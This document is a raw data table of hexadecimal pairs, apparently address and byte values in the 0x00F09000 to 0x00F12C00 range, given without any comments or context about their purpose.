0x00F0EBB0, 0x0000005D, 0x00F0E0D8, 0x0000003A, 0x00F0E4F8, 0x0000001B, 0x00F0EC90, 0x00000023, 0x00F0A2B0, 0x00000003, 0x00F0CBD8, 0x0000003E, 0x00F0C728, 0x00000067, 0x00F0EC80, 0x00000072, 0x00F0D4A0, 0x0000006B, 0x00F0D5C0, 0x0000002F, 0x00F0A1F8, 0x0000000B, 0x00F0A810, 0x00000056, 0x00F115E0, 0x00000074, 0x00F0E8C8, 0x00000007, 0x00F09B78, 0x00000032, 0x00F12540, 0x00000048, 0x00F0A488, 0x00000030, 0x00F09580, 0x00000027, 0x00F0D630, 0x0000002F, 0x00F09A38, 0x00000064, 0x00F0BF70, 0x0000001F, 0x00F0B3D8, 0x0000000D, 0x00F0F0B0, 0x00000077, 0x00F0D9C0, 0x00000020, 0x00F0E4C0, 0x0000000E, 0x00F0E7F0, 0x00000051, 0x00F10900, 0x00000064, 0x00F0B0B0, 0x00000064, 0x00F0A7C8, 0x00000020, 0x00F0A330, 0x00000021, 0x00F0BB38, 0x00000078, 0x00F10318, 0x0000007C, 0x00F09BF0, 0x00000065, 0x00F0EB78, 0x0000006E, 0x00F0BD98, 0x00000054, 0x00F122A0, 0x00000009, 0x00F12A90, 0x00000026, 0x00F0EEC0, 0x0000003C, 0x00F0A340, 0x0000004A, 0x00F0A5C8, 0x00000010, 0x00F0F5C8, 0x0000003A, 0x00F12090, 0x0000007C, 0x00F0ECA8, 0x00000010, 0x00F09A30, 0x00000045, 0x00F0AE70, 0x00000013, 0x00F0F220, 0x00000021, 0x00F0D7A8, 0x00000004, 0x00F12620, 0x00000057, 0x00F11CE8, 0x00000055, 0x00F0F6D0, 0x00000045, 0x00F0D3C0, 0x00000033, 0x00F0DFC0, 0x0000006E, 0x00F0E9D0, 0x0000001C, 0x00F0EF08, 0x00000073, 0x00F0C698, 0x00000054, 0x00F0A718, 0x00000040, 0x00F0AA40, 0x0000005C, 0x00F0B0E0, 0x00000013, 0x00F09720, 0x00000005, 0x00F11448, 0x00000053, 0x00F09458, 0x00000068, 0x00F0F450, 0x00000064, 0x00F10138, 0x0000001E, 0x00F0AB90, 0x00000049, 0x00F12178, 0x00000001, 0x00F0A230, 0x0000003F, 0x00F0C7A0, 0x00000019, 0x00F11320, 0x00000063, 0x00F0BF30, 0x00000030, 0x00F0ED30, 0x00000047, 0x00F0A4B8, 0x00000028, 0x00F0ECF8, 0x00000019, 0x00F0F9A8, 0x00000010, 0x00F0FAE8, 0x0000005F, 0x00F09A70, 0x00000068, 0x00F12AB8, 0x0000004B, 0x00F129C0, 0x0000005E, 0x00F0E508, 0x00000035, 0x00F11578, 0x00000031, 0x00F0B630, 0x0000002B, 0x00F0B2D0, 0x00000018, 0x00F11670, 0x0000006A, 0x00F0BCF8, 0x0000007E, 0x00F0AD40, 0x0000001C, 0x00F0ECF0, 0x00000034, 0x00F0E188, 0x0000002E, 0x00F0E3A0, 0x0000000D, 0x00F0C4A8, 0x00000064, 0x00F10FC8, 0x0000000E, 0x00F108A8, 0x00000018, 0x00F0B960, 0x00000007, 0x00F0A590, 0x0000005A, 0x00F0FB28, 0x0000005F, 0x00F0BF48, 0x0000003B, 0x00F0F3D8, 0x00000051, 0x00F0E900, 0x0000003E, 0x00F10AF8, 0x00000067, 0x00F0FFF8, 0x00000006, 0x00F0BF08, 0x00000002, 0x00F09358, 0x00000034, 0x00F0CB90, 0x00000025, 0x00F0B8F8, 0x00000009, 0x00F09C50, 0x0000006A, 0x00F12A60, 0x0000005D, 0x00F0D110, 0x0000003D, 0x00F0A758, 0x00000054, 0x00F0C960, 0x00000053, 0x00F09480, 0x0000000E, 0x00F0B890, 0x0000007B, 0x00F0B888, 0x0000000D, 0x00F0D468, 0x00000041, 0x00F0C130, 0x00000031, 0x00F10F78, 0x0000006D, 0x00F0D4E0, 0x00000008, 0x00F0B350, 0x0000006D, 0x00F0D7E8, 0x0000002F, 0x00F10890, 0x0000002A, 0x00F0ABD8, 0x00000021, 0x00F09A48, 0x00000054, 0x00F0B8A8, 0x0000001D, 0x00F0FC50, 0x00000030, 0x00F0C0C0, 0x00000019, 0x00F0E7C0, 0x00000069, 0x00F0FF88, 0x0000005E, 0x00F0D7F8, 0x0000006A, 0x00F0FB10, 0x00000028, 0x00F101D8, 0x00000062, 0x00F11498, 0x00000012, 0x00F0E740, 0x0000004B, 0x00F0BA18, 0x0000001A, 0x00F09BD0, 0x0000002D, 0x00F121F8, 0x0000007B, 0x00F0BAB8, 0x0000000C, 0x00F09098, 0x00000028, 0x00F0ED48, 0x00000001, 0x00F0ABB8, 0x0000002D, 0x00F0A8B8, 0x0000001D, 0x00F0A458, 0x00000051, 0x00F0B8F8, 0x0000000B, 0x00F0D630, 0x0000002A, 0x00F12B68, 0x0000000F, 0x00F10998, 0x0000006F, 0x00F09078, 0x00000043, 0x00F0BE68, 0x0000005B, 0x00F0C520, 0x00000049, 0x00F11FE8, 0x0000005C, 0x00F0BA50, 0x0000005B, 0x00F0D148, 0x0000006C, 0x00F10B78, 0x00000043, 0x00F12538, 0x00000036, 0x00F0A0D0, 0x00000054, 0x00F0D0D8, 0x00000079, 0x00F0A9D8, 0x0000005D, 0x00F0DFA8, 0x00000050, 0x00F10B40, 0x00000025, 0x00F09570, 0x0000003C, 0x00F115D0, 0x0000006F, 0x00F11960, 0x00000034, 0x00F0D280, 0x00000019, 0x00F11A28, 0x0000006F, 0x00F0D410, 0x0000005F, 0x00F12208, 0x00000054, 0x00F0FC00, 0x00000038, 0x00F0BF90, 0x0000003A, 0x00F0CFD8, 0x00000068, 0x00F0BC40, 0x0000004E, 0x00F0DCE0, 0x00000055, 0x00F11540, 0x00000057, 0x00F0C7E8, 0x0000007C, 0x00F123A8, 0x0000004E, 0x00F0A528, 0x0000004D, 0x00F0FBD0, 0x00000044, 0x00F0C3C0, 0x0000003D, 0x00F096B8, 0x0000002A, 0x00F0AB28, 0x0000005A, 0x00F0BF88, 0x0000001A, 0x00F12688, 0x00000024, 0x00F12AF8, 0x00000073, 0x00F12BE8, 0x00000029, 0x00F0D258, 0x0000000F, 0x00F0EFA0, 0x00000045, 0x00F09970, 0x00000055, 0x00F0F6C0, 0x0000003A, 0x00F09378, 0x0000000A, 0x00F0C368, 0x00000028, 0x00F09E20, 0x00000072, 0x00F0D0E8, 0x0000003B, 0x00F0ABD0, 0x00000057, 0x00F09FA8, 0x00000051, 0x00F11E90, 0x0000006A, 0x00F12B00, 0x00000045, 0x00F0FFE8, 0x0000000B, 0x00F0C3D8, 0x0000005A, 0x00F0ED08, 0x0000000E, 0x00F0F588, 0x0000003D, 0x00F09460, 0x00000072, 0x00F0BBC0, 0x00000041, 0x00F0CD80, 0x00000022, 0x00F0ACE0, 0x00000056, 0x00F0C200, 0x00000031, 0x00F0BF10, 0x00000036, 0x00F0BE50, 0x00000044, 0x00F10600, 0x00000054, 0x00F0E9A8, 0x00000076, 0x00F0A518, 0x0000002A, 0x00F09928, 0x0000007E, 0x00F0BE80, 0x0000004F, 0x00F0E468, 0x0000005D, 0x00F0C5F8, 0x0000006F, 0x00F0AB60, 0x00000065, 0x00F0D4E8, 0x0000002F, 0x00F0D820, 0x00000059, 0x00F09488, 0x00000072, 0x00F0C1B8, 0x00000069, 0x00F10910, 0x00000030, 0x00F0A4D0, 0x0000005E, 0x00F0E6B0, 0x00000025, 0x00F0BCF0, 0x00000039, 0x00F0CEB0, 0x00000023, 0x00F0EE60, 0x0000000D, 0x00F10D80, 0x00000072, 0x00F12948, 0x00000052, 0x00F0D0A8, 0x00000035, 0x00F0A0D8, 0x00000012, 0x00F12AE8, 0x00000072, 0x00F0BF98, 0x00000020, 0x00F09AF8, 0x00000059, 0x00F0CC18, 0x00000021, 0x00F0C1B0, 0x00000017, 0x00F0C6D0, 0x0000004F, 0x00F0EBC0, 0x0000006F, 0x00F0A928, 0x00000007, 0x00F0D580, 0x0000001A, 0x00F0A988, 0x0000002C, 0x00F09938, 0x0000005D, 0x00F0F4F0, 0x00000068, 0x00F09FF0, 0x0000007A, 0x00F0B170, 0x00000039, 0x00F0D578, 0x00000072, 0x00F0C330, 0x00000017, 0x00F106E8, 0x0000001E, 0x00F0BA20, 0x0000004B, 0x00F0C7C8, 0x00000048, 0x00F0D5D0, 0x0000000F, 0x00F0D638, 0x00000012, 0x00F12250, 0x00000059, 0x00F0D740, 0x00000066, 0x00F0D0D8, 0x0000000A, 0x00F12280, 0x00000067, 0x00F0A9D0, 0x00000060, 0x00F0F758, 0x0000005D, 0x00F0CCE0, 0x00000040, 0x00F0F3E0, 0x0000003A, 0x00F0C220, 0x00000073, 0x00F0CE70, 0x0000002F, 0x00F0F5F8, 0x00000039, 0x00F0C338, 0x00000059, 0x00F123B8, 0x00000060, 0x00F0B590, 0x0000002B, 0x00F0BA48, 0x0000004A, 0x00F09258, 0x0000006E, 0x00F0D5F0, 0x0000007B, 0x00F0F940, 0x0000000E, 0x00F0C588, 0x0000002C, 0x00F09BB0, 0x00000001, 0x00F0B6D0, 0x00000000, 0x00F0FE90, 0x00000064, 0x00F0C0B8, 0x00000035, 0x00F0F5D0, 0x00000055, 0x00F09A80, 0x00000025, 0x00F0E098, 0x00000038, 0x00F103B0, 0x00000036, 0x00F10718, 0x00000029, 0x00F0FBA8, 0x0000003F, 0x00F0B348, 0x00000056, 0x00F11EF8, 0x0000006A, 0x00F0E720, 0x00000064, 0x00F0BDB8, 0x0000000D, 0x00F0C110, 0x00000007, 0x00F10ED0, 0x0000001C, 0x00F0CED8, 0x00000004, 0x00F09A00, 0x0000001C, 0x00F0A860, 0x00000066, 0x00F0D510, 0x00000050, 0x00F0B240, 0x0000000F, 0x00F12478, 0x00000057, 0x00F0DC60, 0x00000005, 0x00F0A1D0, 0x0000002E, 0x00F128C8, 0x00000044, 0x00F0B430, 0x0000002C, 0x00F0CC40, 0x0000004C, 0x00F0D068, 0x0000006B, 0x00F10D48, 0x0000004F, 0x00F0B7A8, 0x0000004F, 0x00F0B6E8, 0x0000001A, 0x00F0C520, 0x0000006E, 0x00F0F528, 0x0000003A, 0x00F128A8, 0x00000033, 0x00F0F3D0, 0x0000006C, 0x00F09758, 0x00000001, 0x00F0CA30, 0x0000005B, 0x00F09130, 0x00000005, 0x00F0A510, 0x0000002F, 0x00F102A0, 0x0000002A, 0x00F0ABD0, 0x00000002, 0x00F10AC8, 0x00000056, 0x00F0C7F0, 0x00000034, 0x00F0B410, 0x00000031, 0x00F0C150, 0x00000034, 0x00F0ECF8, 0x0000006C, 0x00F0B548, 0x0000003E, 0x00F0F5B8, 0x00000023, 0x00F0DC68, 0x00000012, 0x00F0DD40, 0x00000028, 0x00F0C750, 0x00000038, 0x00F0CD38, 0x0000001E, 0x00F0C2A0, 0x00000050, 0x00F0E168, 0x00000008, 0x00F112A8, 0x00000000, 0x00F0E318, 0x00000020, 0x00F115A0, 0x00000065, 0x00F0DCF8, 0x00000055, 0x00F11CD8, 0x0000005B, 0x00F0B878, 0x00000006, 0x00F0AAB8, 0x0000003D, 0x00F0DF68, 0x00000076, 0x00F0CDA8, 0x00000008, 0x00F0A2A0, 0x00000020, 0x00F11BD8, 0x0000001E, 0x00F0DDD0, 0x00000043, 0x00F0F0E8, 0x00000069, 0x00F0F378, 0x00000069, 0x00F0FAD0, 0x00000031, 0x00F0ECA8, 0x00000025, 0x00F0E4B0, 0x00000062, 0x00F0D380, 0x00000067, 0x00F09100, 0x0000001D, 0x00F12838, 0x0000002B, 0x00F0B478, 0x0000003B, 0x00F12120, 0x0000005A, 0x00F0C5D8, 0x00000041, 0x00F0F840, 0x00000062, 0x00F0DE98, 0x0000003A, 0x00F11918, 0x00000032, 0x00F0A340, 0x00000022, 0x00F0C6D8, 0x0000003B, 0x00F0F760, 0x0000004F, 0x00F0A6D0, 0x0000000A, 0x00F11D40, 0x00000066, 0x00F0D928, 0x0000000A, 0x00F0D2D8, 0x0000006D, 0x00F0B2D0, 0x00000044, 0x00F0B838, 0x00000075, 0x00F10A10, 0x0000003A, 0x00F0C710, 0x00000072, 0x00F129C0, 0x0000001C, 0x00F12C30, 0x0000003A, 0x00F0B380, 0x00000015, 0x00F0C890, 0x0000003D, 0x00F0B918, 0x00000010, 0x00F11150, 0x00000001, 0x00F10B90, 0x00000027, 0x00F0DB68, 0x0000005C, 0x00F0DC88, 0x00000011, 0x00F101B0, 0x00000000, 0x00F0B130, 0x0000004B, 0x00F0D930, 0x0000005E, 0x00F0B510, 0x0000005C, 0x00F09BF8, 0x0000006E, 0x00F0DE00, 0x00000055, 0x00F0EF20, 0x0000004A, 0x00F0CA58, 0x0000007C, 0x00F0E838, 0x0000004E, 0x00F0BA68, 0x00000057, 0x00F11B18, 0x00000024, 0x00F0B968, 0x00000059, 0x00F124D8, 0x0000004B, 0x00F0EC40, 0x0000000C, 0x00F09FD0, 0x0000002B, 0x00F11AD8, 0x00000074, 0x00F103A8, 0x00000034, 0x00F0CA40, 0x00000068, 0x00F127E8, 0x0000001C, 0x00F0B380, 0x00000044, 0x00F12AD0, 0x00000028, 0x00F09DC0, 0x00000030, 0x00F0A4E8, 0x00000031, 0x00F0A670, 0x0000002C, 0x00F11AA0, 0x0000004D, 0x00F0B830, 0x00000057, 0x00F0A3A0, 0x0000002A, 0x00F09C00, 0x00000011, 0x00F0ABC8, 0x00000037, 0x00F090A0, 0x00000056, 0x00F0E590, 0x00000000, 0x00F0C248, 0x00000016, 0x00F12058, 0x00000066, 0x00F0D250, 0x00000043, 0x00F0FE90, 0x00000031, 0x00F0CB98, 0x00000079, 0x00F0DD30, 0x0000006B, 0x00F0D410, 0x0000006D, 0x00F0E0E8, 0x0000003E, 0x00F09F88, 0x00000002, 0x00F0A730, 0x00000025, 0x00F0B418, 0x0000002F, 0x00F0F930, 0x0000002E, 0x00F0AFE8, 0x00000026, 0x00F0B5B0, 0x00000022, 0x00F0F738, 0x00000058, 0x00F127E0, 0x00000045, 0x00F12818, 0x0000003D, 0x00F0D548, 0x0000001E, 0x00F11928, 0x0000002B, 0x00F09160, 0x00000056, 0x00F11698, 0x00000058, 0x00F0B668, 0x00000030, 0x00F0D8B8, 0x00000012, 0x00F0D9A0, 0x00000032, 0x00F10D98, 0x00000038, 0x00F0FF18, 0x00000078, 0x00F0EFE8, 0x00000063, 0x00F0ED48, 0x0000003A, 0x00F0B718, 0x00000072, 0x00F0DF88, 0x00000013, 0x00F0A240, 0x0000004B, 0x00F0F4D0, 0x00000010, 0x00F0A380, 0x0000001D, 0x00F0D0C0, 0x0000000D, 0x00F0F080, 0x00000052, 0x00F11A18, 0x00000067, 0x00F0B988, 0x0000002C, 0x00F0E370, 0x0000000B, 0x00F09478, 0x0000000D, 0x00F0A998, 0x00000073, 0x00F0D9A8, 0x00000073, 0x00F10A28, 0x00000009, 0x00F105E0, 0x00000059, 0x00F0AD68, 0x00000001, 0x00F09398, 0x0000002E, 0x00F0ADD0, 0x00000039, 0x00F0E100, 0x00000054, 0x00F0CF18, 0x0000001C, 0x00F0DA80, 0x00000047, 0x00F0FB70, 0x0000000A, 0x00F0D760, 0x00000059, 0x00F0B678, 0x00000068, 0x00F0A9E8, 0x0000002B, 0x00F096C8, 0x00000042, 0x00F0C6C8, 0x00000036, 0x00F09F80, 0x00000012, 0x00F0E170, 0x0000003F, 0x00F12690, 0x00000042, 0x00F095B8, 0x00000063, 0x00F10558, 0x0000005A, 0x00F09DE8, 0x00000004, 0x00F0D5C0, 0x0000006B, 0x00F0BB78, 0x0000007D, 0x00F09F38, 0x0000004C, 0x00F0BAE8, 0x00000040, 0x00F09A28, 0x00000016, 0x00F10C88, 0x00000043, 0x00F10B78, 0x00000009, 0x00F0E8F8, 0x0000006B, 0x00F104F0, 0x0000003E, 0x00F0FC30, 0x0000004A, 0x00F0A4E0, 0x00000045, 0x00F0EA38, 0x00000011, 0x00F0A760, 0x0000003C, 0x00F0B230, 0x00000039, 0x00F0A848, 0x00000049, 0x00F0B240, 0x0000007D, 0x00F0AAE8, 0x00000068, 0x00F0C7A8, 0x00000039, 0x00F0FCB0, 0x0000002A, 0x00F0D0A0, 0x00000071, 0x00F09D20, 0x0000005A, 0x00F0D0B0, 0x00000000, 0x00F0F8A8, 0x00000021, 0x00F11D28, 0x0000006F, 0x00F09320, 0x00000013, 0x00F10C70, 0x00000074, 0x00F10C80, 0x0000006E, 0x00F0D940, 0x00000044, 0x00F0E188, 0x0000002F, 0x00F0E498, 0x0000007D, 0x00F0CD48, 0x00000075, 0x00F0BC20, 0x00000016, 0x00F0A0C0, 0x00000013, 0x00F09340, 0x00000063, 0x00F102C0, 0x0000006C, 0x00F0F680, 0x00000027, 0x00F0A390, 0x00000028, 0x00F11D58, 0x0000005F, 0x00F0EE88, 0x00000029, 0x00F0FC50, 0x00000022, 0x00F0D068, 0x00000079, 0x00F109C0, 0x00000040, 0x00F0F298, 0x00000011, 0x00F0B3C0, 0x0000001A, 0x00F0F718, 0x00000002, 0x00F0BBA0, 0x00000039, 0x00F0D888, 0x00000034, 0x00F11D98, 0x0000002A, 0x00F0BBC8, 0x00000000, 0x00F0FAD0, 0x0000003F, 0x00F117E8, 0x0000006E, 0x00F0BFF0, 0x0000001C, 0x00F11648, 0x00000075, 0x00F0E7C8, 0x00000023, 0x00F12A88, 0x00000049, 0x00F0F860, 0x00000055, 0x00F0E3C8, 0x00000058, 0x00F0B560, 0x00000027, 0x00F11520, 0x00000061, 0x00F09F00, 0x00000043, 0x00F12A08, 0x00000042, 0x00F0E288, 0x0000005D, 0x00F09798, 0x00000079, 0x00F09490, 0x0000007C, 0x00F0A240, 0x00000060, 0x00F0CC58, 0x00000077, 0x00F0C2A8, 0x00000033, 0x00F09E48, 0x0000006C, 0x00F0C740, 0x00000065, 0x00F0DE00, 0x0000006D, 0x00F0F970, 0x0000004E, 0x00F0C158, 0x00000043, 0x00F0F2B0, 0x00000035, 0x00F0FDD8, 0x00000007, 0x00F0A528, 0x00000034, 0x00F0E038, 0x00000052, 0x00F0F6D8, 0x00000074, 0x00F0CB08, 0x00000041, 0x00F0BBF0, 0x0000006D, 0x00F0FBA0, 0x0000003C, 0x00F0C3E8, 0x00000055, 0x00F0CDD0, 0x00000021, 0x00F0C400, 0x00000063, 0x00F0AAB8, 0x00000027, 0x00F0E0F8, 0x0000003E, 0x00F10678, 0x0000004C, 0x00F0F340, 0x00000030, 0x00F0B2C8, 0x0000000D, 0x00F11AE8, 0x00000045, 0x00F0BCA8, 0x00000028, 0x00F0CBE8, 0x0000000A, 0x00F0A430, 0x00000042, 0x00F0FA08, 0x00000003, 0x00F11D90, 0x00000027, 0x00F0E210, 0x00000054, 0x00F0A3B8, 0x00000004, 0x00F09608, 0x00000027, 0x00F11DC0, 0x00000035, 0x00F0B738, 0x00000057, 0x00F0E980, 0x00000037, 0x00F12C30, 0x00000073, 0x00F0D0F8, 0x00000035, 0x00F0E0B8, 0x0000000A, 0x00F11318, 0x0000003F, 0x00F0B4B0, 0x00000060, 0x00F10F88, 0x00000038, 0x00F0DFD8, 0x0000000A, 0x00F0B5E0, 0x00000075, 0x00F12C18, 0x00000063, 0x00F09CA8, 0x0000003B, 0x00F097B0, 0x00000021, 0x00F10B18, 0x0000004C, 0x00F0E2D0, 0x00000040, 0x00F0A7A8, 0x00000015, 0x00F0E680, 0x00000007, 0x00F0E2B0, 0x00000073, 0x00F0CDA8, 0x0000001B, 0x00F12038, 0x00000005, 0x00F0D260, 0x00000023, 0x00F0A920, 0x00000048, 0x00F0D488, 0x0000000F, 0x00F0B980, 0x0000004C, 0x00F11B88, 0x00000002, 0x00F0D890, 0x0000003C, 0x00F0AF48, 0x00000072, 0x00F12720, 0x00000009, 0x00F0C6A0, 0x00000070, 0x00F0C2C8, 0x0000007D, 0x00F0EE88, 0x00000039, 0x00F0BCC0, 0x00000010, 0x00F0BC20, 0x00000019, 0x00F12030, 0x0000001F, 0x00F12120, 0x00000075, 0x00F0B140, 0x00000000, 0x00F0EB68, 0x00000066, 0x00F0DD48, 0x00000004, 0x00F0F838, 0x00000074, 0x00F0E348, 0x00000067, 0x00F0A470, 0x0000006E, 0x00F098F8, 0x00000048, 0x00F11FD8, 0x00000006, 0x00F12640, 0x0000000C, 0x00F0CB98, 0x0000007E, 0x00F0ECC8, 0x00000064, 0x00F0B638, 0x00000053, 0x00F11408, 0x00000054, 0x00F0DCE0, 0x00000055, 0x00F11390, 0x00000062, 0x00F0D498, 0x0000006E, 0x00F0B790, 0x00000055, 0x00F10B60, 0x0000006B, 0x00F0B668, 0x00000037, 0x00F0CAB0, 0x00000067, 0x00F11B68, 0x0000006E, 0x00F0CD50, 0x00000069, 0x00F0CBA0, 0x00000037, 0x00F0D2C8, 0x00000016, 0x00F11288, 0x00000026, 0x00F0C318, 0x00000039, 0x00F0B090, 0x0000003B, 0x00F0BA90, 0x00000070, 0x00F0CDC8, 0x00000002, 0x00F10D70, 0x00000032, 0x00F0A4D0, 0x0000004D, 0x00F112D0, 0x00000014, 0x00F11220, 0x00000018, 0x00F0CDF8, 0x0000006E, 0x00F0A470, 0x00000006, 0x00F0C080, 0x00000062, 0x00F09F58, 0x00000032, 0x00F11628, 0x0000003D, 0x00F0F788, 0x0000000B, 0x00F0CC20, 0x0000004C, 0x00F0DE78, 0x00000022, 0x00F0BAE0, 0x0000002F, 0x00F0D3E8, 0x0000001B, 0x00F092A0, 0x00000022, 0x00F12A40, 0x0000001A, 0x00F099E0, 0x0000004A, 0x00F103B0, 0x00000054, 0x00F12A10, 0x0000001D, 0x00F10930, 0x00000044, 0x00F0D480, 0x00000057, 0x00F0E0E0, 0x00000007, 0x00F0EFD8, 0x00000009, 0x00F12320, 0x00000067, 0x00F111B8, 0x0000005B, 0x00F10968, 0x00000077, 0x00F0CC30, 0x00000073, 0x00F0B708, 0x0000002A, 0x00F129F0, 0x0000001C, 0x00F10408, 0x0000000C, 0x00F11998, 0x0000001D, 0x00F0DCA8, 0x00000004, 0x00F0EAA8, 0x0000005F, 0x00F0D9E8, 0x0000005B, 0x00F095C8, 0x0000006E, 0x00F0BBD0, 0x00000042, 0x00F0CF68, 0x00000032, 0x00F0E340, 0x00000035, 0x00F10008, 0x00000022, 0x00F0EBC0, 0x0000002E, 0x00F0AB48, 0x00000056, 0x00F0B788, 0x0000007B, 0x00F09BE0, 0x00000001, 0x00F103B8, 0x0000005F, 0x00F10B10, 0x00000061, 0x00F10E38, 0x0000007B, 0x00F0B208, 0x00000040, 0x00F0C908, 0x00000019, 0x00F0B380, 0x00000061, 0x00F0A478, 0x0000006A, 0x00F0CD90, 0x0000000E, 0x00F0A4E8, 0x0000005D, 0x00F0C7C0, 0x00000033, 0x00F11450, 0x0000006D, 0x00F11C08, 0x00000023, 0x00F0A3F0, 0x0000000F, 0x00F0C2C8, 0x00000071, 0x00F0CAE0, 0x00000027, 0x00F0C758, 0x0000000E, 0x00F0F910, 0x0000003E, 0x00F0E9F0, 0x00000009, 0x00F0DFB0, 0x00000041, 0x00F109A8, 0x00000015, 0x00F0D560, 0x00000010, 0x00F12BF8, 0x00000061, 0x00F121E8, 0x0000006F, 0x00F0B300, 0x0000002D, 0x00F12390, 0x0000004A, 0x00F0A440, 0x0000003A, 0x00F12B88, 0x0000007E, 0x00F0FFD0, 0x00000026, 0x00F0FBF8, 0x00000076, 0x00F11280, 0x00000014, 0x00F0F3F8, 0x00000059, 0x00F099E8, 0x00000062, 0x00F0B310, 0x00000030, 0x00F11F58, 0x00000041, 0x00F0CB78, 0x0000001A, 0x00F097B0, 0x00000045, 0x00F0ED28, 0x0000000E, 0x00F0D6C8, 0x0000001B, 0x00F09E38, 0x00000043, 0x00F0C2F8, 0x00000024, 0x00F0C778, 0x00000026, 0x00F0C868, 0x0000004D, 0x00F0A9F0, 0x00000018, 0x00F0EB30, 0x0000006B, 0x00F109D0, 0x0000005A, 0x00F0CFE0, 0x0000004D, 0x00F0F288, 0x0000001F, 0x00F0E2E0, 0x0000006C, 0x00F0DEB0, 0x00000009, 0x00F10290, 0x00000067, 0x00F0B910, 0x0000002D, 0x00F0C830, 0x0000002B, 0x00F0DFE0, 0x0000001D, 0x00F0BA70, 0x00000070, 0x00F10AA0, 0x00000026, 0x00F10FB8, 0x00000072, 0x00F12260, 0x00000077, 0x00F11EF8, 0x00000016, 0x00F10540, 0x00000056, 0x00F0BFA0, 0x00000061, 0x00F12180, 0x00000021, 0x00F118A0, 0x00000052, 0x00F0C7D8, 0x00000069, 0x00F12070, 0x0000003C, 0x00F0D470, 0x0000007C, 0x00F0BB48, 0x0000007B, 0x00F0F5B0, 0x00000005, 0x00F0C360, 0x00000044, 0x00F0D910, 0x0000002F, 0x00F0A6F0, 0x0000006F, 0x00F09CA8, 0x00000001, 0x00F0DFF8, 0x00000042, 0x00F0AD90, 0x0000002A, 0x00F10930, 0x0000006D, 0x00F0C600, 0x00000039, 0x00F0D1A0, 0x00000018, 0x00F09900, 0x0000004A, 0x00F10B40, 0x00000006, 0x00F0B968, 0x00000017, 0x00F0FE28, 0x0000000F, 0x00F0F5E0, 0x00000032, 0x00F0A850, 0x00000025, 0x00F0B620, 0x0000001C, 0x00F0E240, 0x00000037, 0x00F0E838, 0x00000023, 0x00F0C4C8, 0x0000004A, 0x00F0E948, 0x00000020, 0x00F125F0, 0x00000062, 0x00F0E448, 0x00000012, 0x00F122D0, 0x00000051, 0x00F0AF28, 0x0000002C, 0x00F0C0F0, 0x0000004A, 0x00F0E658, 0x00000047, 0x00F0DD60, 0x0000006F, 0x00F0B1F0, 0x00000069, 0x00F0AB40, 0x0000004C, 0x00F095B0, 0x0000002E, 0x00F0C058, 0x0000003A, 0x00F0CD58, 0x0000004E, 0x00F0FE10, 0x00000053, 0x00F096D0, 0x00000037, 0x00F10978, 0x0000005C, 0x00F10248, 0x00000040, 0x00F0B1B0, 0x0000004E, 0x00F09080, 0x0000006C, 0x00F0D118, 0x00000064, 0x00F0D280, 0x00000000, 0x00F10790, 0x0000005A, 0x00F0BD88, 0x00000010, 0x00F0BA78, 0x0000003D, 0x00F101F8, 0x00000010, 0x00F0DAB8, 0x0000007D, 0x00F0E0E0, 0x00000063, 0x00F0DAB0, 0x00000031, 0x00F106A0, 0x00000061, 0x00F091D0, 0x0000000C, 0x00F11660, 0x0000001C, 0x00F0D040, 0x0000002B, 0x00F09160, 0x00000001, 0x00F0E0B0, 0x00000023, 0x00F0D138, 0x00000062, 0x00F12BC8, 0x00000078, 0x00F0E9C8, 0x0000006D, 0x00F0BDC0, 0x00000053, 0x00F09C08, 0x00000002, 0x00F0ABC0, 0x00000046, 0x00F0D0B8, 0x0000001C, 0x00F09810, 0x0000005A, 0x00F0CDF8, 0x00000064, 0x00F0D228, 0x0000002D, 0x00F0A030, 0x00000005, 0x00F12B40, 0x00000004, 0x00F0A160, 0x0000005E, 0x00F10560, 0x0000005E, 0x00F0CDD8, 0x00000068, 0x00F0DD70, 0x0000002E, 0x00F09FC0, 0x0000007D, 0x00F0BA20, 0x0000007E, 0x00F0AA78, 0x0000001B, 0x00F0C8C0, 0x00000069, 0x00F0AE58, 0x00000066, 0x00F11308, 0x0000000C, 0x00F0F478, 0x0000000B, 0x00F10188, 0x0000003C, 0x00F09170, 0x00000045, 0x00F0CE30, 0x00000076, 0x00F12390, 0x0000004E, 0x00F0CB28, 0x0000007C, 0x00F0BA18, 0x0000007D, 0x00F0D320, 0x0000004E, 0x00F0AEB0, 0x00000066, 0x00F0ACB0, 0x0000005B, 0x00F11540, 0x00000032, 0x00F0FF28, 0x00000017, 0x00F0BB58, 0x0000000F, 0x00F09B50, 0x00000075, 0x00F10508, 0x00000068, 0x00F0C508, 0x00000036, 0x00F0F5F0, 0x00000040, 0x00F0E0E0, 0x0000002A, 0x00F0AB18, 0x0000005C, 0x00F10A20, 0x0000007E, 0x00F0D678, 0x0000003B, 0x00F0BD78, 0x0000006A, 0x00F0BD08, 0x0000005C, 0x00F09E30, 0x00000074, 0x00F0B860, 0x00000054, 0x00F0B570, 0x00000044, 0x00F0CED0, 0x0000005E, 0x00F096D0, 0x00000008, 0x00F0AAA0, 0x0000003D, 0x00F0E9B8, 0x0000007A, 0x00F12A80, 0x00000024, 0x00F11A40, 0x0000000F, 0x00F0A228, 0x00000005, 0x00F12358, 0x00000050, 0x00F0E258, 0x00000000, 0x00F12BD8, 0x00000061, 0x00F0A070, 0x00000032, 0x00F10DF8, 0x00000062, 0x00F097A8, 0x00000043, 0x00F0EED8, 0x00000074, 0x00F114B0, 0x00000071, 0x00F0BAB0, 0x0000002A, 0x00F125A0, 0x00000049, 0x00F0D320, 0x0000003B, 0x00F0D398, 0x00000001, 0x00F0AFE8, 0x00000021, 0x00F0E3D8, 0x00000016, 0x00F10CF0, 0x00000017, 0x00F09318, 0x00000013, 0x00F0B830, 0x00000002, 0x00F0BE80, 0x0000002A, 0x00F0BB58, 0x0000005E, 0x00F0DBF8, 0x00000001, 0x00F09BB0, 0x0000001E, 0x00F0C878, 0x00000068, 0x00F0AFA0, 0x00000019, 0x00F0B358, 0x00000066, 0x00F0BD70, 0x00000075, 0x00F0F6B0, 0x0000001C, 0x00F10120, 0x00000049, 0x00F0ADF8, 0x00000018, 0x00F0A630, 0x0000003F, 0x00F12340, 0x00000025, 0x00F0E298, 0x00000072, 0x00F0D3D0, 0x00000005, 0x00F090A8, 0x0000003A, 0x00F09D90, 0x0000003C, 0x00F0E260, 0x0000005D, 0x00F0CB08, 0x0000005C, 0x00F0BF90, 0x0000000B, 0x00F09B08, 0x00000065, 0x00F0C338, 0x00000054, 0x00F125E0, 0x00000043, 0x00F09578, 0x00000036, 0x00F0A2C8, 0x0000006F, 0x00F0B2C0, 0x0000006F, 0x00F12B88, 0x00000030, 0x00F12680, 